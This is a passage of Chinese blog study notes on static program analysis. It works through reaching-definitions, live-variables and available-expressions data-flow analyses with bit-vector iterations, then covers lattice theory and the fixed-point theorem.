<li><code>IN[B2] - killB2 = 1100 0000 - 0100 0000 = 1000 0000</code></li>
<li><code>OUT[B2] = genB2 U (IN[B2] - killB2) = 0011 0000 + 1000 0000 = 1011 0000</code>   </li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230121420467.png" alt="image-20221230121420467"></p>
</li>
<li><p><code>B2-&gt;B3</code>：</p>
<ul>
<li><p><code>OUT[B2] = genB2 U (IN[B2] - killB2) = 0011 0000 + 1000 0000 = 1011 0000</code>   </p>
</li>
<li><p><code>IN[B3]  = Up OUT[p] = OUT[B2] = 1011 0000</code></p>
</li>
<li><p><code>genB3 = D7 = 0000 0010</code></p>
</li>
<li><p><code>killB3 = D1 + D5  = 1000 1000</code></p>
</li>
<li><p><code>IN[B3] - killB3 = 1011 0000 - 1000 1000 = 0011 0000</code></p>
</li>
<li><p><code>OUT[B3] = genB3 U (IN[B3] - killB3) = 0000 0010 + 0011 0000 = 0011 0010</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230122517800.png" alt="image-20221230122517800"></p>
</li>
</ul>
</li>
<li><p><code>B2-&gt;B4</code>：</p>
<ul>
<li><p><code>OUT[B2] = genB2 U (IN[B2] - killB2) = 0011 0000 + 1000 0000 = 1011 0000</code>   </p>
</li>
<li><p><code>IN[B4] = Up OUT[p] = OUT[B2] = 1011 0000 </code></p>
</li>
<li><p><code>genB4 = D5 + D6 = 0000 1100</code></p>
</li>
<li><p><code>killB4 = D1 + D7 + D8 = 1000 0011</code></p>
</li>
<li><p><code>IN[B4] - killB4 = 1011 0000 - 1000 0011 = 0011 0000</code></p>
</li>
<li><p><code>OUT[B4] = genB4 U (IN[B4] - killB4) = 0000 1100 + 0011 0000 = 0011 1100</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230122538028.png" alt="image-20221230122538028"></p>
</li>
</ul>
</li>
<li><p><code>B4、B3-&gt;B5</code></p>
<ul>
<li><p><code>OUT[B3] = genB3 U (IN[B3] - killB3) = 0000 0010 + 0011 0000 = 0011 0010</code></p>
</li>
<li><p><code>OUT[B4] = genB4 U (IN[B4] - killB4) = 0000 1100 + 0011 0000 = 0011 1100</code></p>
</li>
<li><p><code>IN[B5] = Up OUT[p] = OUT[B3] + OUT[B4] = 0011 0010 + 0011 1100 = 0011 1110</code></p>
</li>
<li><p><code>genB5 = D8 = 0000 0001</code></p>
</li>
<li><p><code>killB5 = D6 = 0000 0100</code></p>
</li>
<li><p><code>IN[B5] - killB5 = 0011 1110 - 0000 0100 = 0011 1010</code></p>
</li>
<li><p><code>OUT[B5] = genB5 U (IN[B5] - killB5) = 0000 0001 + 0011 1010 = 0011 1011</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230122557226.png" alt="image-20221230122557226"></p>
</li>
</ul>
</li>
</ul>
<p>那么由于第一次迭代之后，<code>B1、B2、B3、B4、B5</code>的<code>OUT</code>都发生改变了，所以继续迭代，所有基本块的<code>OUT</code>被本次迭代结果替换</p>

        <h5 id="第二次迭代"   >
          <a href="#第二次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代" class="headerlink" title="第二次迭代"></a>第二次迭代</h5>
      <p>完成如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230122957105.png" alt="image-20221230122957105"></p>
<p>那么基本块<code>B2、B3</code>的<code>OUT</code>发生了改变，接着迭代</p>

        <h5 id="第三次迭代"   >
          <a href="#第三次迭代" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代" class="headerlink" title="第三次迭代"></a>第三次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230123059166.png" alt="image-20221230123059166"></p>
<p>迭代之后，所有基本块的<code>OUT</code>都没有发生改变，那么即可得到最终结果。</p>

        <h5 id="最终含义"   >
          <a href="#最终含义" class="heading-link"><i class="fas fa-link"></i></a><a href="#最终含义" class="headerlink" title="最终含义"></a>最终含义</h5>
      <p>依据最终结果，即所有基本块的<code>OUT[Bn]</code>可得，比如对于<code>OUT[B1]</code>而言，对应结果为<code>1100 0000</code>，代表<code>D1、D2</code>可以<code>Reach</code>到<code>B1</code>结束的地方，也就是说<code>D1、D2</code>所定义的变量从被定义到<code>B1</code>结束的地方都不会被改变。</p>

        <h1 id="三、Data-Flow-Analysis-Applications-II"   >
          <a href="#三、Data-Flow-Analysis-Applications-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、Data-Flow-Analysis-Applications-II" class="headerlink" title="三、Data Flow Analysis - Applications II"></a>三、Data Flow Analysis - Applications II</h1>
      
        <h2 id="1-Live-Variables-Analysis"   >
          <a href="#1-Live-Variables-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Live-Variables-Analysis" class="headerlink" title="1.Live Variables Analysis"></a>1.Live Variables Analysis</h2>
      <p>即存在一个变量<code>v</code>在点<code>p</code>被定义，然后程序中还存在一个变量<code>v</code>被使用的地方<code>use(v)</code>，满足从<code>p</code>到<code>use(v)</code>这条路径上，<code>v</code>没有被重新定义，那么可以称为变量<code>v</code>在点<code>p</code>到<code>use(v)</code>这条路径上是存活的，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230155034133.png" alt="image-20221230155034133"></p>
<ul>
<li>应用</li>
</ul>
<p>比如寄存器满的状态，这时候在<code>p</code>点发现变量<code>v</code>是<code>dead</code>的，并且该变量在寄存器中，那么新的变量最好就是替换掉<code>dead</code>变量<code>v</code>。</p>

        <h3 id="Data-Flow-Facts-1"   >
          <a href="#Data-Flow-Facts-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Data-Flow-Facts-1" class="headerlink" title="Data Flow Facts"></a>Data Flow Facts</h3>
      <p>将所有变量的标记为一个<code>bit</code>向量，和之前类似，<code>1</code>表<code>alive</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230155541698.png" alt="image-20221230155541698"></p>

        <h3 id="Control-Flow-1"   >
          <a href="#Control-Flow-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Control-Flow-1" class="headerlink" title="Control Flow"></a>Control Flow</h3>
      <p>用来求<code>OUT[B]</code>的，例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230163405006.png" alt="image-20221230163405006"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OUT[B] = Us successor of B IN[S]</span><br></pre></td></tr></table></div></figure>

<p>其中<code>Us</code>代表取<code>B</code>的后继，即所有的<code>s</code>做<code>union</code>操作，即并集</p>

        <h3 id="Transfer-Function-1"   >
          <a href="#Transfer-Function-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Function-1" class="headerlink" title="Transfer Function"></a>Transfer Function</h3>
      <p>由于是<code>backward</code>，所以即知道<code>OUB[B]</code>来求<code>IN[B]</code><br>$$<br>IN[B] = use_B\ U\ (OUT[B]\ -\ def_B)<br>$$</p>
<ul>
<li><p><code>useB</code>：在基本块<code>BB</code>中在重定义之前被使用的变量的合集</p>
<p>比如某个基本块<code>v = 2; k = v</code>，由于<code>v</code>是在被重定义之后被使用的，所以变量<code>v</code>不被归入到<code>useB</code>中</p>
</li>
<li><p><code>defB</code>：在基本块<code>BB</code>中被重定义或首次定义的变量的合集</p>
</li>
</ul>

        <h3 id="Algorithm-1"   >
          <a href="#Algorithm-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithm-1" class="headerlink" title="Algorithm"></a>Algorithm</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230163808603.png" alt="image-20221230163808603"></p>
<p>同样进行简单初始化即可开始迭代</p>

        <h4 id="例子-1"   >
          <a href="#例子-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4>
      <p>如下所示，初始化之后即可迭代</p>

        <h5 id="第一次迭代-1"   >
          <a href="#第一次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-1" class="headerlink" title="第一次迭代"></a>第一次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230164205006.png" alt="image-20221230164205006"></p>
<ul>
<li><p><code>Exit-&gt;B5</code>：</p>
<ul>
<li><code>IN[Exit] = 000 0000</code></li>
<li> <code>OUT[B5] = Us IN[s] = IN[Exit] = 000 0000</code></li>
<li><code>defB5 = z = 001 0000</code></li>
<li><code>useB5 = p = 000 1000</code></li>
<li><code>OUT[B5] - defB5 = 000 0000</code></li>
<li><code>IN[B5] = useB5 + (OUT[B5] - defB5) = 000 1000 + 000 0000 = 000 1000 </code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171348741.png" alt="image-20221230171348741"></p>
</li>
<li><p><code>B5-&gt;B3</code>：</p>
<ul>
<li><code>IN[B5] = useB5 + (OUT[B5] - defB5) = 000 0100 + 000 0000 = 000 1000 </code></li>
<li><code>OUT[B3] = Us IN[s] = IN[B5] = 000 1000</code></li>
<li><code>defB3 = x = 100 0000</code></li>
<li><code>useB3 = x = 100 0000</code></li>
<li><code>OUT[B3] - defB3 = 000 1000</code></li>
<li><code>IN[B3] = useB3 + (OUT[B3] - defB3) = 100 0000 + 000 1000 = 100 1000</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171409470.png" alt="image-20221230171409470"></p>
</li>
<li><p><code>B5-&gt;B4</code>：</p>
<ul>
<li><code>IN[B5] = useB5 + (OUT[B5] - defB5) = 000 0100 + 000 0000 = 000 1000 </code></li>
<li><code>OUT[B4] = Us IN[s] = IN[B5] + IN[B2] = 000 1000 + 000 0000 = 000 1000 </code></li>
<li><code>defB4 = x + q = 100 0100</code>  </li>
<li><code>useB4 = y = 010 0000</code></li>
<li><code>OUT[B4] - defB4 = 000 1000</code></li>
<li><code>IN[B4] = useB4 + (OUT[B4] - defB4) = 010 0000 + 000 1000 = 010 1000</code> </li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171426774.png" alt="image-20221230171426774"></p>
</li>
<li><p><code>B4、B3-&gt;B2</code>:</p>
<ul>
<li><p><code>IN[B4] = useB4 + (OUT[B4] - defB4) = 010 0000 + 000 1000 = 010 1000</code> </p>
</li>
<li><p><code>IN[B3] = useB3 + (OUT[B3] - defB3) = 100 0000 + 000 1000 = 100 1000</code></p>
</li>
<li><p><code>OUT[B2] = Us IN[s] = IN[B3] + IN[B4] = 110 1000 </code></p>
</li>
<li><p><code>defB2 = m + y = 010 0010</code></p>
</li>
<li><p><code>useB2 = k = 000 0001</code></p>
<p>注意<code>m</code>是在被使用之前重定义了，所以不能算在<code>useB2</code>中</p>
</li>
<li><p><code>OUT[B2] - defB2 = 100 1000</code></p>
</li>
<li><p><code>IN[B2] = useB2 + (OUT[B2] - defB2) = 000 0001 + 100 1000 = 100 1001</code></p>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171452976.png" alt="image-20221230171452976"></p>
</li>
<li><p><code>B2-&gt;B1</code>：</p>
<ul>
<li><code>IN[B2] = userB2 + (OUT[B2] - defB2) = 000 0001 + 100 1000 = 100 1001</code></li>
<li><code>OUT[B1] = Us IN[s] = IN[B2] = 100 1001</code></li>
<li><code>defB1 = x + y = 110 0000</code></li>
<li><code>useB1 = p + q + z = 001 1100</code></li>
<li><code>OUT[B1] - defB1 = 000 1001</code></li>
<li><code>IN[B1] = useB1 + (OUT[B1] - defB1) = 001 1100 + 000 1001 = 001 1101</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171510996.png" alt="image-20221230171510996"></p>
</li>
</ul>
<p>基本块<code>B1、B2、B3、B4、B5</code>的<code>IN[]</code>都发生改变，需要再次迭代，结果如下</p>

        <h5 id="第二次迭代-1"   >
          <a href="#第二次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-1" class="headerlink" title="第二次迭代"></a>第二次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230170947293.png" alt="image-20221230170947293"></p>
<p>其中<code>B4</code>的<code>IN[]</code>发生改变，需要再次迭代，结果如下</p>

        <h5 id="第三次迭代-1"   >
          <a href="#第三次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代-1" class="headerlink" title="第三次迭代"></a>第三次迭代</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230171054036.png" alt="image-20221230171054036"></p>
<p>没有基本块的<code>IN[]</code>被改变了，那么不用迭代了</p>

        <h5 id="最终含义-1"   >
          <a href="#最终含义-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#最终含义-1" class="headerlink" title="最终含义"></a>最终含义</h5>
      <p>同样道理，依据最终结果，比如这里的<code>IN[B3]</code>为<code>100 1000</code>，那么代表在进入基本块<code>B3</code>之前，变量<code>x、p</code>是存活的，在之后的流程中会用到，其他变量在之后的流程不会用到，为<code>dead</code>变量</p>

        <h2 id="2-Available-Expressions-Analysis"   >
          <a href="#2-Available-Expressions-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Available-Expressions-Analysis" class="headerlink" title="2.Available Expressions Analysis"></a>2.Available Expressions Analysis</h2>
      <ul>
<li><p>概念</p>
<p>一个表达式<code>x op y</code>如果说在在<code>p</code>点是<code>available</code>的话，那么满足如下条件：</p>
<ul>
<li><p>所有从<code>entry</code>到<code>p</code>的路径都会计算表达式<code>x op y</code></p>
</li>
<li><p>在最后一次计算表达式<code>x op y</code>之后，到<code>p</code>之前，没有再重新定义变量<code>x</code>或者<code> y</code></p>
</li>
</ul>
</li>
<li><p>应用</p>
<ul>
<li>可以将一个<code>available</code>的表达式<code>x op y</code>的计算结果，替换成上一次计算表达式<code>x op y </code>的结果，使得不再重复计算</li>
<li>用来检测全局公用的子表达式</li>
</ul>
</li>
<li><p>类型：</p>
<ul>
<li>属于是<code>must analysis</code>，一旦分析出结果，代表该结果一定正确，一定是为<code>available</code></li>
</ul>
</li>
</ul>

        <h3 id="Data-Flow-Facts-2"   >
          <a href="#Data-Flow-Facts-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Data-Flow-Facts-2" class="headerlink" title="Data Flow Facts"></a>Data Flow Facts</h3>
      <p>和之前类似，将所有表达式都用<code>bit</code>向量表示，为1代表<code>available</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230190653551.png" alt="image-20221230190653551"></p>

        <h3 id="Control-Flow-2"   >
          <a href="#Control-Flow-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Control-Flow-2" class="headerlink" title="Control Flow"></a>Control Flow</h3>
      <p><code>forward</code>中求<code>IN[B]</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230112722811.png" alt="image-20221230112722811"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = ∩p predecessor of B OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>即为<code>∩p</code>求基本块<code>B</code>所有前驱的<code>OUT[p]</code>的交集</p>

        <h3 id="Transfer-Function-2"   >
          <a href="#Transfer-Function-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Transfer-Function-2" class="headerlink" title="Transfer Function"></a>Transfer Function</h3>
      <p>为<code>forward</code>，知道<code>IN[B]</code>用来求<code>OUT[B]</code><br>$$<br>OUT[B] = gen_B\ U\ (IN[B] - kill_B)<br>$$</p>
<ul>
<li><p><code>genB</code>：当前基本块中用到的表达式</p>
</li>
<li><p><code>killB</code>：所有在<code>IN[]</code>中的表达式的变量参与进基本块<code>B</code>中重新定义的表达式合集</p>
<p>比如基本块<code> a = x op y</code>，其中<code>IN[B]</code>为<code>a + b</code>，那么由于<code>IN</code>中变量<code>a</code>在基本块<code>B</code>中重新定义了，所以将<code>IN[B]</code>中关于变量<code>a</code>的表达式都加入到<code>killB</code>中</p>
</li>
</ul>

        <h3 id="Algorithm-2"   >
          <a href="#Algorithm-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithm-2" class="headerlink" title="Algorithm"></a>Algorithm</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230192724776.png" alt="image-20221230192724776"></p>
<p>这里的除了<code>entry</code>外，其他基本块都初始化为<code>top</code>，即<code>1111..111</code>，因为就算有个表达式没有找出来，那就只是代表少优化一次，不影响程序本身的运行流程</p>

        <h4 id="例子-2"   >
          <a href="#例子-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4>
      <p>如下所示，初始化之后即可开始迭代</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230192931922.png" alt="image-20221230192931922"></p>

        <h5 id="第一次迭代-2"   >
          <a href="#第一次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一次迭代-2" class="headerlink" title="第一次迭代"></a>第一次迭代</h5>
      <ul>
<li><p><code>Entry-&gt;B1</code>：</p>
<ul>
<li><code>OUT[Entry] = 00000</code></li>
<li><code>IN[B1] = ∩p predecessor of B OUT[p] = OUT[Entry] = 00000</code></li>
<li><code>genB1 = p-1 = 10000</code></li>
<li><code>killB1 = 00000</code></li>
<li><code>IN[B1] - killB1 = 00000</code></li>
<li><code>OUT[B1] = genB1 + (IN[B1] - killB1) = 10000</code></li>
</ul>
</li>
<li><p><code>B1-&gt;B2</code>：</p>
<ul>
<li><code>OUT[B1] = 10000 </code></li>
<li><code>IN[B2] = ∩p predecessor of B OUT[p] = OUT[B1] ∩ OUT[B4] = 10000 ∩ 11111 = 10000</code></li>
<li><code>genB2 = z/5和e^7*x = 01010</code></li>
<li><code>killB2 = p-1 = 10000</code></li>
<li><code>IN[B2] - killB2 = 00000</code></li>
<li><code>OUT[B2] = genB2 + (IN[B2] - killB2) = 01010</code></li>
</ul>
</li>
<li><p><code>B2-&gt;B3</code>：</p>
<ul>
<li><p><code>OUT[B2] = 01010</code></p>
</li>
<li><p><code>IN[B3] = ∩p predecessor of B OUT[p] = OUT[B2] = 01010</code></p>
</li>
<li><p><code>genB3 = y+3 = 00001</code></p>
</li>
<li><p><code>killB3 = 01000</code></p>
<p>其中<code>z</code>在<code>IN[B3]</code>中有表达式<code>z/5</code>用到，那么需要将对应表达式加入到<code>killB3</code>集合中</p>
</li>
<li><p><code>IN[B3] - killB3 = 00010</code></p>
</li>
<li><p><code>OUT[B3] = genB3 + (IN[B3] - killB3) = 00011</code></p>
</li>
</ul>
</li>
<li><p><code>B2-&gt;B4</code>：</p>
<ul>
<li><code>OUT[B2] = 01010</code></li>
<li><code>IN[B4] = ∩p predecessor of B OUT[p] = OUT[B2] = 01010</code></li>
<li><code>genB4 = 2*y和e^7*x = 00110</code></li>
<li><code>killB4 = 00010</code></li>
<li><code>IN[B4] - killB4 = 01000</code></li>
<li><code>OUT[B4] = genB3 + (IN[B4] - killB4) = 01110</code></li>
</ul>
</li>
<li><p><code>B3、B4-&gt;B5</code>：</p>
<ul>
<li><code>OUT[B3] = 00011</code></li>
<li><code>OUT[B4] = 01110</code></li>
<li><code>IN[B5] = ∩p predecessor of B OUT[p] = OUT[B4] ∩ OUT[B3] = 00010</code></li>
<li><code>genB5 = e^7*x和z/5 = 01010</code></li>
<li><code>killB5 = 00000</code></li>
<li><code>IN[B5] - killB5 = 00010</code></li>
<li><code>OUT[B5] = genB5 + (IN[B5] - killB5) = 01010</code></li>
</ul>
</li>
</ul>
<p>基本块<code>B1、B2、B3、B4、B5</code>的<code>OUT[]</code>都发生改变，需要再次遍历</p>

        <h5 id="第二次迭代-2"   >
          <a href="#第二次迭代-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-2" class="headerlink" title="第二次迭代"></a>第二次迭代</h5>
      <p>同理可得，结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230195310159.png" alt="image-20221230195310159"></p>
<p>没有基本块的<code>OUT[]</code>发生改变，可为最终结果</p>

        <h5 id="最终含义-2"   >
          <a href="#最终含义-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#最终含义-2" class="headerlink" title="最终含义"></a>最终含义</h5>
      <p>依据最终结果，拿基本块<code>B2</code>而言，对于表达式<code>e^7*x</code>是<code>available</code>的，那么在程序第一次经过<code>B2</code>时，由于表达式<code>e^7*x</code>还没被计算，那么先计算，然后保存。当通过循环第二次经过<code>B2</code>时，其表达式<code>e^7*x</code>就可以被直接替换为上一次表达式的值，在这里也就是在基本块<code>B4</code>中得到的值，其他的同理可得。</p>

        <h2 id="3-Data-Flow-Analysis总结"   >
          <a href="#3-Data-Flow-Analysis总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Data-Flow-Analysis总结" class="headerlink" title="3.Data Flow Analysis总结"></a>3.Data Flow Analysis总结</h2>
      
        <h3 id="异同"   >
          <a href="#异同" class="heading-link"><i class="fas fa-link"></i></a><a href="#异同" class="headerlink" title="异同"></a>异同</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230200017051.png" alt="image-20221230200017051"></p>

        <h3 id="需要掌握的"   >
          <a href="#需要掌握的" class="heading-link"><i class="fas fa-link"></i></a><a href="#需要掌握的" class="headerlink" title="需要掌握的"></a>需要掌握的</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221230200156658.png" alt="image-20221230200156658"></p>
<p>三种数据流分析算法、异同以及为什么迭代算法可以停止</p>
<p>停止的原因就是迭代到最后，最差的情况就是全是<code>top:1111..</code>或者全是<code>bottom:0000....</code></p>

        <h1 id="四、Data-Flow-Analysis-Foundations-I"   >
          <a href="#四、Data-Flow-Analysis-Foundations-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、Data-Flow-Analysis-Foundations-I" class="headerlink" title="四、Data Flow Analysis - Foundations I"></a>四、Data Flow Analysis - Foundations I</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105124710.png" alt="image-20230114105124710"></p>

        <h2 id="1-偏序-Partial-Order"   >
          <a href="#1-偏序-Partial-Order" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-偏序-Partial-Order" class="headerlink" title="1.偏序(Partial Order)"></a>1.偏序(Partial Order)</h2>
      <p><code>poset</code>偏序集</p>
<p>性质：<br>$$<br>\begin{align}<br>&amp;\forall x \in P,x\subseteq x\quad &amp;(Reflexivity)\<br>&amp;\forall x,y \in P,x\subseteq y ∧ y\subseteq x =&gt;x=y\quad &amp;(Antisymmetry)\<br>&amp;\forall x,y,z\in P,x\subseteq y ∧ y\subseteq z =&gt;x \subseteq z \quad &amp;(Transitivity)<br>\end{align}<br>$$</p>

        <h2 id="2-Upper-and-Lower-Bounds"   >
          <a href="#2-Upper-and-Lower-Bounds" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Upper-and-Lower-Bounds" class="headerlink" title="2.Upper and Lower Bounds"></a>2.Upper and Lower Bounds</h2>
      <p>$$<br>u\in P,u\ is \ an \ upper\ bound\ of\ S,if\ \forall x\in S,x\subseteq u\<br>l\in P,l\ is \ an \ lower\ bound\ of\ S,if\ \forall x\in S,l\subseteq x\<br>$$</p>
<ul>
<li><p><code>lub/join(least upper bound)</code></p>
<p><code>lub</code>定义符号为<code>⊔S</code>，满足<code>⊔S ⊑ u</code>，<code>u</code>为上界</p>
</li>
<li><p><code>glb/meet(greatest lower bound)</code></p>
<p><code>glb</code>定义符号为<code>⊓S</code>，满足<code>l ⊑ ⊓S</code>，</p>
</li>
<li><p>如果<code>S ⊑ P(P,⊑)  </code>，并且<code>S</code>只有两个元素，假定为<code>S=&#123;a,b&#125;</code>，那么可得如下</p>
<ul>
<li><code>⊔S = a⊔b  (join)</code></li>
<li><code>⊓S = a⊓b  (meet)</code></li>
</ul>
</li>
<li><p>不是所有偏序集都有最大下界或者最小上界</p>
</li>
<li><p>如果一个偏序集有最大下界或者最小上界，那么一定是唯一的</p>
</li>
</ul>

        <h2 id="3-Lattice"   >
          <a href="#3-Lattice" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Lattice" class="headerlink" title="3.Lattice"></a>3.Lattice</h2>
      
        <h3 id="Lattice-格"   >
          <a href="#Lattice-格" class="heading-link"><i class="fas fa-link"></i></a><a href="#Lattice-格" class="headerlink" title="Lattice(格)"></a>Lattice(格)</h3>
      <p>如果一个偏序集中任意两个元素组成一个集合，都有最小上界和最大下界存在，那么该偏序集即为一个<code>lattice</code></p>
<p><code>P(P,⊑), ∀a,b∈P, a⊔b and a⊓b exists =&gt; P is a lattice </code></p>

        <h3 id="Semilattice-半格"   >
          <a href="#Semilattice-半格" class="heading-link"><i class="fas fa-link"></i></a><a href="#Semilattice-半格" class="headerlink" title="Semilattice(半格)"></a>Semilattice(半格)</h3>
      <p>如果一个偏序集中任意两个元素组成一个集合，最小上界和最大下界中只有一个存在，那么该偏序集即为一个<code>Semilattice</code></p>
<ul>
<li><code>join semilattic</code>：<code>a⊔b</code>存在，<code>a⊓b</code>不存在</li>
<li><code>meet semilattic</code>：<code>a⊓b</code>存在，<code>a⊔b</code>不存在</li>
</ul>

        <h3 id="Complete-Lattic-全格"   >
          <a href="#Complete-Lattic-全格" class="heading-link"><i class="fas fa-link"></i></a><a href="#Complete-Lattic-全格" class="headerlink" title="Complete Lattic(全格)"></a>Complete Lattic(全格)</h3>
      
        <h4 id="定义：-2"   >
          <a href="#定义：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#定义：-2" class="headerlink" title="定义："></a>定义：</h4>
      <p>如果对于一个偏序集中任意一个子集，都有最小上界和最大下界存在，那么该偏序集即为一个<code>Complete Lattice</code></p>
<p>每一个全集都有一个最大元素和最小元素</p>
<ul>
<li>最大元素<code>(a greatest element T) = ⊔P = top</code></li>
<li>最小元素<code>(a least element ⊥) = ⊓P = bottom</code></li>
</ul>

        <h4 id="性质："   >
          <a href="#性质：" class="heading-link"><i class="fas fa-link"></i></a><a href="#性质：" class="headerlink" title="性质："></a>性质：</h4>
      <p>所有有限的<code>Lattice</code>都是<code>Complete Lattic</code>，但是一个<code>Complete Lattic</code>不一定是有限的，比如<code>0-1</code>这个偏序集中所有实数(包括0,1)作为一个集合，存在边界，是一个<code>Complete Lattic</code>，但是里面的子集的元素就可以是无限的。</p>

        <h3 id="Product-Lattice"   >
          <a href="#Product-Lattice" class="heading-link"><i class="fas fa-link"></i></a><a href="#Product-Lattice" class="headerlink" title="Product Lattice"></a>Product Lattice</h3>
      <p>一个<code>Lattice</code>合集，其中所有<code>Lattice</code>都由最小上界和最大上界，那么即可称该<code>Lattice</code>合集为一个<code>Product Lattice</code></p>

        <h2 id="4-Fixed-Point"   >
          <a href="#4-Fixed-Point" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Fixed-Point" class="headerlink" title="4.Fixed-Point"></a>4.Fixed-Point</h2>
      
        <h3 id="Monotonicity-单调"   >
          <a href="#Monotonicity-单调" class="heading-link"><i class="fas fa-link"></i></a><a href="#Monotonicity-单调" class="headerlink" title="Monotonicity(单调)"></a>Monotonicity(单调)</h3>
      <p>对于一个<code>Lattice L</code>，有函数<code>f:∀x∈L,f(x)∈L</code>，假定该函数存在单调性，则<code>L</code>满足单调</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">∀x,y∈L,x⊑y =&gt; f(x)⊑f(y)</span><br></pre></td></tr></table></div></figure>

<p>🔺<strong>mark：那单调性怎么证明呢？</strong></p>

        <h3 id="Fixed-Point-Theorem-不动点理论"   >
          <a href="#Fixed-Point-Theorem-不动点理论" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fixed-Point-Theorem-不动点理论" class="headerlink" title="Fixed-Point Theorem(不动点理论)"></a>Fixed-Point Theorem(不动点理论)</h3>
      <p>给定一个<code>Complete Lattice L</code>，<code>L</code>满足单调且有限，那么可以用来求不动点</p>

        <h4 id="最小不动点"   >
          <a href="#最小不动点" class="heading-link"><i class="fas fa-link"></i></a><a href="#最小不动点" class="headerlink" title="最小不动点"></a>最小不动点</h4>
      
        <h5 id="含义"   >
          <a href="#含义" class="heading-link"><i class="fas fa-link"></i></a><a href="#含义" class="headerlink" title="含义"></a>含义</h5>
      <p>$$<br>f(⊥),f(f(⊥)),…..,f^k(⊥)会达到最小不动点<br>$$</p>

        <h5 id="证明"   >
          <a href="#证明" class="heading-link"><i class="fas fa-link"></i></a><a href="#证明" class="headerlink" title="证明"></a>证明</h5>
      <ul>
<li><p>首先是存在不动点证明<br>$$<br>\begin{align}<br>&amp;\because\forall x,y\in L,x\subseteq y =&gt; f(x)\subseteq f(y)(Monntonicity)\<br>&amp;\therefore⊥\subseteq f(⊥)\<br>&amp;\therefore f(⊥)\subseteq f(f(⊥)) = f^2(⊥)\<br>&amp;\therefore ⊥\subseteq f(⊥) \subseteq f^2(⊥)\subseteq …\subseteq f^i(⊥)\<br>&amp;\because L\ is\ finite\<br>&amp;\therefore f^{Fix} = f^k(⊥) = f^{k+1}(⊥)<br>\end{align}<br>$$</p>
</li>
